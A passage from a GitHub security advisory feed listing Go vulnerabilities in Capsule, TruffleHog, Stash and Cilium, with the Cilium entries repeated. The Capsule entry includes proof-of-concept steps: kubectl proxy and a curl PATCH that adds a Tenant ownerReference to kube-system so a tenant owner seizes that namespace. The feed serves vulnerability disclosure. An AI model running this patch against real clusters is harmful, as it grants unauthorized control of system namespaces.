  name: tenant1
spec:
  owners:
  - name: alice
    kind: User
EOF
</code></pre>
<ol start="4">
<li>Create user alice</li>
</ol>
<pre><code>./create-user.sh alice tenant1 capsule.clastix.io
export KUBECONFIG=alice-tenant1.kubeconfig
</code></pre>
<ol start="5">
<li>Patch kube-system (The first command is executed in the current shell, while the 2nd and 3rd commands require a different shell window because the current shell is being used as a proxy.)</li>
</ol>
<pre><code>kubectl proxy

export DATA='[{"op": "add", "path": "/metadata/ownerReferences", "value":[{"apiVersion": "capsule.clastix.io/v1beta2", "blockOwnerDeletion": true, "controller": true, "kind": "Tenant", "name": "tenant1", "uid": "ce3f2296-4aaa-45b0-a8fe-879d5096f193"}]}]'

curl http://localhost:8001/api/v1/namespaces/kube-system/ -X PATCH -d "$DATA" -H "Content-Type: application/json-patch+json"
</code></pre>
<ol start="7">
<li>Check the result
The kube-system is patched successfully.
<img alt="image" src="https://github.com/projectcapsule/capsule/assets/151004196/e2775304-c1f4-494d-ab15-14f6f33e29ec"></li>
</ol>
<h1 id="summary">Summary</h1>
<p>The tenant-owner can patch any arbitrary namespace that has not been taken over by a tenant (i.e., namespaces without the ownerReference field), thereby gaining control of that namespace.</p>
<p>I would like to express my apologies once again. I have always been sincere in my research and communication, and I did not intend to disturb you on purpose.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/projectcapsule/capsule/security/advisories/GHSA-mq69-4j5w-3qwp">https://github.com/projectcapsule/capsule/security/advisories/GHSA-mq69-4j5w-3qwp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39690">https://nvd.nist.gov/vuln/detail/CVE-2024-39690</a></li>
<li><a href="https://github.com/projectcapsule/capsule/commit/d620b0457ddec01616b8eab8512a10611611f584">https://github.com/projectcapsule/capsule/commit/d620b0457ddec01616b8eab8512a10611611f584</a></li>
<li><a href="https://github.com/advisories/GHSA-mq69-4j5w-3qwp">https://github.com/advisories/GHSA-mq69-4j5w-3qwp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mq69-4j5w-3qwp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-20T18:34:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/trufflesecurity/trufflehog/v3] Trufflehog vulnerable to Blind SSRF in some Detectors]]></title>
        <id>https://github.com/advisories/GHSA-3r74-v83p-f4f4</id>
        <link href="https://github.com/advisories/GHSA-3r74-v83p-f4f4"/>
        <updated>2024-08-19T17:29:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>This vulnerability allows a malicious actor to craft data in a way that, when scanned by specific detectors, could trigger the detector to make an unauthorized request to an endpoint chosen by the attacker. For an exploit to be effective, the target endpoint must be an unauthenticated GET endpoint that produces side effects. The victim must scan the maliciously crafted data and have such an endpoint targeted for the exploit to succeed.</p>
<h3 id="patches">Patches</h3>
<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
<p>The vulnerability has been resolved in TruffleHog v3.81.9 and later versions. Users should upgrade to this or a more recent version to mitigate the issue.</p>
<p><em>Special thanks to Karan Bamal, Security Researcher at Sentinel One for this discovery</em></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/trufflesecurity/trufflehog/security/advisories/GHSA-3r74-v83p-f4f4">https://github.com/trufflesecurity/trufflehog/security/advisories/GHSA-3r74-v83p-f4f4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43379">https://nvd.nist.gov/vuln/detail/CVE-2024-43379</a></li>
<li><a href="https://github.com/trufflesecurity/trufflehog/commit/fe5624c70923355128868cffd647b6e2cfe11443">https://github.com/trufflesecurity/trufflehog/commit/fe5624c70923355128868cffd647b6e2cfe11443</a></li>
<li><a href="https://github.com/advisories/GHSA-3r74-v83p-f4f4">https://github.com/advisories/GHSA-3r74-v83p-f4f4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3r74-v83p-f4f4</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-08-19T17:29:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/stashapp/stash] SQL injection in github.com/stashapp/stash]]></title>
        <id>https://github.com/advisories/GHSA-75jf-52jg-qqh4</id>
        <link href="https://github.com/advisories/GHSA-75jf-52jg-qqh4"/>
        <updated>2024-08-16T19:27:56.000Z</updated>
        <content type="html"><![CDATA[<p>Stash up to v0.25.1 was discovered to contain a SQL injection vulnerability via the sort parameter.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32231">https://nvd.nist.gov/vuln/detail/CVE-2024-32231</a></li>
<li><a href="https://github.com/stashapp/stash/pull/4865">https://github.com/stashapp/stash/pull/4865</a></li>
<li><a href="https://github.com/stashapp/stash/commit/89553864f5fa92beaa37a12e489064b1358d9880">https://github.com/stashapp/stash/commit/89553864f5fa92beaa37a12e489064b1358d9880</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2024-3070">https://pkg.go.dev/vuln/GO-2024-3070</a></li>
<li><a href="https://github.com/advisories/GHSA-75jf-52jg-qqh4">https://github.com/advisories/GHSA-75jf-52jg-qqh4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-75jf-52jg-qqh4</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-08-15T18:31:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cilium/cilium] Cilium leaks information via incorrect ReferenceGrant update logic in Gateway API]]></title>
        <id>https://github.com/advisories/GHSA-vwf8-q6fw-4wcm</id>
        <link href="https://github.com/advisories/GHSA-vwf8-q6fw-4wcm"/>
        <updated>2024-08-16T18:45:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Due to ReferenceGrant changes not being immediately propagated in Cilium's GatewayAPI controller, Gateway resources are able to access secrets in other namespaces after the associated ReferenceGrant has been revoked. This can lead to Gateways continuing to establish sessions using secrets that they should no longer have access to.</p>
<h3 id="patches">Patches</h3>
<p>This issue was resolved in <a href="https://github.com/cilium/cilium/pull/34032">https://github.com/cilium/cilium/pull/34032</a>.</p>
<p>This issue affects:</p>
<ul>
<li>Cilium v1.15 between v1.15.0 and v1.15.7 inclusive</li>
<li>Cilium v1.16.0</li>
</ul>
<p>This issue has been patched in:</p>
<ul>
<li>Cilium v1.15.8</li>
<li>Cilium v1.16.1</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Any modification of a related Gateway/HTTPRoute/GRPCRoute/TCPRoute CRD (for example, adding any label to any of these resources) will trigger a reconciliation of ReferenceGrants on an affected cluster.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>The Cilium community has worked together with members of Cure53 and Isovalent to prepare these mitigations. Special thanks to @sayboras for resolving this issue.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, please reach out on <a href="https://docs.cilium.io/en/latest/community/community/#slack">Slack</a>.</p>
<p>If you think you have found a vulnerability affecting Cilium, we strongly encourage you to report it to our security mailing list at <a href="mailto:security@cilium.io">security@cilium.io</a>. This is a private mailing list for the Cilium security team, and your report will be treated as top priority.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cilium/cilium/security/advisories/GHSA-vwf8-q6fw-4wcm">https://github.com/cilium/cilium/security/advisories/GHSA-vwf8-q6fw-4wcm</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42486">https://nvd.nist.gov/vuln/detail/CVE-2024-42486</a></li>
<li><a href="https://github.com/cilium/cilium/pull/34032">https://github.com/cilium/cilium/pull/34032</a></li>
<li><a href="https://github.com/cilium/cilium/commit/414a96b53d51ef6e6645c44426e26bc8e7c7c059">https://github.com/cilium/cilium/commit/414a96b53d51ef6e6645c44426e26bc8e7c7c059</a></li>
<li><a href="https://github.com/cilium/cilium/commit/92c110e58a7be6586819dd51fb0f6ee1ec4be8f8">https://github.com/cilium/cilium/commit/92c110e58a7be6586819dd51fb0f6ee1ec4be8f8</a></li>
<li><a href="https://github.com/cilium/cilium/commit/ed3dfa0aab8b80f7e841a6d49d2a990ac2dca053">https://github.com/cilium/cilium/commit/ed3dfa0aab8b80f7e841a6d49d2a990ac2dca053</a></li>
<li><a href="https://github.com/advisories/GHSA-vwf8-q6fw-4wcm">https://github.com/advisories/GHSA-vwf8-q6fw-4wcm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vwf8-q6fw-4wcm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-16T18:45:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cilium/cilium] Cilium leaks information via incorrect ReferenceGrant update logic in Gateway API]]></title>
        <id>https://github.com/advisories/GHSA-vwf8-q6fw-4wcm</id>
        <link href="https://github.com/advisories/GHSA-vwf8-q6fw-4wcm"/>
        <updated>2024-08-16T18:45:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Due to ReferenceGrant changes not being immediately propagated in Cilium's GatewayAPI controller, Gateway resources are able to access secrets in other namespaces after the associated ReferenceGrant has been revoked. This can lead to Gateways continuing to establish sessions using secrets that they should no longer have access to.</p>
<h3 id="patches">Patches</h3>
<p>This issue was resolved in <a href="https://github.com/cilium/cilium/pull/34032">https://github.com/cilium/cilium/pull/34032</a>.</p>
<p>This issue affects:</p>
<ul>
<li>Cilium v1.15 between v1.15.0 and v1.15.7 inclusive</li>
<li>Cilium v1.16.0</li>
</ul>
<p>This issue has been patched in:</p>
<ul>
<li>Cilium v1.15.8</li>
<li>Cilium v1.16.1</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Any modification of a related Gateway/HTTPRoute/GRPCRoute/TCPRoute CRD (for example, adding any label to any of these resources) will trigger a reconciliation of ReferenceGrants on an affected cluster.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>The Cilium community has worked together with members of Cure53 and Isovalent to prepare these mitigations. Special thanks to @sayboras for resolving this issue.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, please reach out on <a href="https://docs.cilium.io/en/latest/community/community/#slack">Slack</a>.</p>
<p>If you think you have found a vulnerability affecting Cilium, we strongly encourage you to report it to our security mailing list at <a href="mailto:security@cilium.io">security@cilium.io</a>. This is a private mailing list for the Cilium security team, and your report will be treated as top priority.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cilium/cilium/security/advisories/GHSA-vwf8-q6fw-4wcm">https://github.com/cilium/cilium/security/advisories/GHSA-vwf8-q6fw-4wcm</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42486">https://nvd.nist.gov/vuln/detail/CVE-2024-42486</a></li>
<li><a href="https://github.com/cilium/cilium/pull/34032">https://github.com/cilium/cilium/pull/34032</a></li>
<li><a href="https://github.com/cilium/cilium/commit/414a96b53d51ef6e6645c44426e26bc8e7c7c059">https://github.com/cilium/cilium/commit/414a96b53d51ef6e6645c44426e26bc8e7c7c059</a></li>
<li><a href="https://github.com/cilium/cilium/commit/92c110e58a7be6586819dd51fb0f6ee1ec4be8f8">https://github.com/cilium/cilium/commit/92c110e58a7be6586819dd51fb0f6ee1ec4be8f8</a></li>
<li><a href="https://github.com/cilium/cilium/commit/ed3dfa0aab8b80f7e841a6d49d2a990ac2dca053">https://github.com/cilium/cilium/commit/ed3dfa0aab8b80f7e841a6d49d2a990ac2dca053</a></li>
<li><a href="https://github.com/advisories/GHSA-vwf8-q6fw-4wcm">https://github.com/advisories/GHSA-vwf8-q6fw-4wcm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vwf8-q6fw-4wcm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-16T18:45:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cilium/cilium] Gateway API route matching order contradicts specification]]></title>
        <id>https://github.com/advisories/GHSA-qcm3-7879-xcww</id>
        <link href="https://github.com/advisories/GHSA-qcm3-7879-xcww"/>
        <updated>2024-08-15T21:46:46.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Gateway API HTTPRoutes and GRPCRoutes do not follow the match precedence specified in the Gateway API specification. In particular, request headers are matched before request methods, when the specification describes that the request methods must be respected before headers are matched (<a href="https://gateway-api.sigs.k8s.io/reference/spec/#gateway.networking.k8s.io/v1.HTTPRouteRule">HTTPRouteRule</a>, <a href="https://gateway-api.sigs.k8s.io/reference/spec/#gateway.networking.k8s.io%2fv1.GRPCRouteRule">GRPCRouteRule</a>).</p>
<p>If users create Gateway API resources that use both request headers and request methods in order to route to different destinations, then traffic may be delivered to the incorrect backend. If the backend does not have Network Policy restricting acceptable traffic to receive, then requests may access information that you did not intend for them to access.</p>
<h3 id="patches">Patches</h3>
<p>This issue was fixed in <a href="https://github.com/cilium/cilium/pull/34109">https://github.com/cilium/cilium/pull/34109</a>.</p>
<p>This issue affects:</p>
<ul>
<li>Cilium v1.15 between v1.15.0 and v1.15.7 inclusive</li>
<li>Cilium v1.16.0</li>
</ul>
<p>This issue is fixed in:</p>
<ul>
<li>Cilium v1.15.8</li>
<li>Cilium v1.16.1</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround for this issue.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>The Cilium community has worked together with members of Cure53 and Isovalent to prepare these mitigations. Special thanks to @sayboras for remediating this issue.</p>
<h3 id="further-information">Further information</h3>
<p>If you have any questions or comments about this advisory, please reach out on <a href="https://docs.cilium.io/en/latest/community/community/#slack">Slack</a>.</p>
<p>If you think you have found a vulnerability affecting Cilium, we strongly encourage you to report it to our security mailing list at <a href="mailto:security@cilium.io">security@cilium.io</a>. This is a private mailing list for the Cilium security team, and your report will be treated as top priority.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cilium/cilium/security/advisories/GHSA-qcm3-7879-xcww">https://github.com/cilium/cilium/security/advisories/GHSA-qcm3-7879-xcww</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42487">https://nvd.nist.gov/vuln/detail/CVE-2024-42487</a></li>
<li><a href="https://github.com/cilium/cilium/pull/34109">https://github.com/cilium/cilium/pull/34109</a></li>
<li><a href="https://github.com/cilium/cilium/commit/a3510fe4a92305822aa1a5e08cb6d6c873c8699a">https://github.com/cilium/cilium/commit/a3510fe4a92305822aa1a5e08cb6d6c873c8699a</a></li>
<li><a href="https://github.com/cilium/cilium/commit/d88772b9c29e370becbc4547cada6711d51edcde">https://github.com/cilium/cilium/commit/d88772b9c29e370becbc4547cada6711d51edcde</a></li>
<li><a href="https://github.com/cilium/cilium/commit/fe42273566a943a0f3174c87b23a195c856b51d6">https://github.com/cilium/cilium/commit/fe42273566a943a0f3174c87b23a195c856b51d6</a></li>
<li><a href="https://github.com/advisories/GHSA-qcm3-7879-xcww">https://github.com/advisories/GHSA-qcm3-7879-xcww</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qcm3-7879-xcww</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-15T21:46:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cilium/cilium] Gateway API route matching order contradicts specification]]></title>
        <id>https://github.com/advisories/GHSA-qcm3-7879-xcww</id>
        <link href="https://github.com/advisories/GHSA-qcm3-7879-xcww"/>
        <updated>2024-08-15T21:46:46.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Gateway API HTTPRoutes and GRPCRoutes do not follow the match precedence specified in the Gateway API specification. In particular, request headers are matched before request methods, when the specification describes that the request methods must be respected before headers are matched (<a href="https://gateway-api.sigs.k8s.io/reference/spec/#gateway.networking.k8s.io/v1.HTTPRouteRule">HTTPRouteRule</a>, <a href="https://gateway-api.sigs.k8s.io/reference/spec/#gateway.networking.k8s.io%2fv1.GRPCRouteRule">GRPCRouteRule</a>).</p>
<p>If users create Gateway API resources that use both request headers and request methods in order to route to different destinations, then traffic may be delivered to the incorrect backend. If the backend does not have Network Policy restricting acceptable traffic to receive, then requests may access information that you did not intend for them to access.</p>
<h3 id="patches">Patches</h3>
<p>This issue was fixed in <a href="https://github.com/cilium/cilium/pull/34109">https://github.com/cilium/cilium/pull/34109</a>.</p>
<p>This issue affects:</p>
<ul>
<li>Cilium v1.15 between v1.15.0 and v1.15.7 inclusive</li>
<li>Cilium v1.16.0</li>
</ul>
<p>This issue is fixed in:</p>
<ul>
<li>Cilium v1.15.8</li>
<li>Cilium v1.16.1</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround for this issue.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>The Cilium community has worked together with members of Cure53 and Isovalent to prepare these mitigations. Special thanks to @sayboras for remediating this issue.</p>
<h3 id="further-information">Further information</h3>
<p>If you have any questions or comments about this advisory, please reach out on <a href="https://docs.cilium.io/en/latest/community/community/#slack">Slack</a>.</p>
<p>If you think you have found a vulnerability affecting Cilium, we strongly encourage you to report it to our security mailing list at <a href="mailto:security@cilium.io">security@cilium.io</a>. This is a private mailing list for the Cilium security team, and your report will be treated as top priority.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cilium/cilium/security/advisories/GHSA-qcm3-7879-xcww">https://github.com/cilium/cilium/security/advisories/GHSA-qcm3-7879-xcww</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42487">https://nvd.nist.gov/vuln/detail/CVE-2024-42487</a></li>
<li><a href="https://github.com/cilium/cilium/pull/34109">https://github.com/cilium/cilium/pull/34109</a></li>
<li><a href="https://github.com/cilium/cilium/commit/a3510fe4a92305822aa1a5e08cb6d6c873c8699a">https://github.com/cilium/cilium/commit/a3510fe4a92305822aa1a5e08cb6d6c873c8699a</a></li>
<li><a href="https://github.com/cilium/cilium/commit/d88772b9c29e370becbc4547cada6711d51edcde">https://github.com/cilium/cilium/commit/d88772b9c29e370becbc4547cada6711d51edcde</a></li>
<li><a href="https://github.com/cilium/cilium/commit/fe42273566a943a0f3174c87b23a195c856b51d6">https://github.com/cilium/cilium/commit/fe42273566a943a0f3174c87b23a195c856b51d6</a></li>
<li><a href="https://github.com/advisories/GHSA-qcm3-7879-xcww">https://github.com/advisories/GHSA-qcm3-7879-xcww</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qcm3-7879-xcww</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-15T21:46:46.000Z</published>
    </entry>
</feed>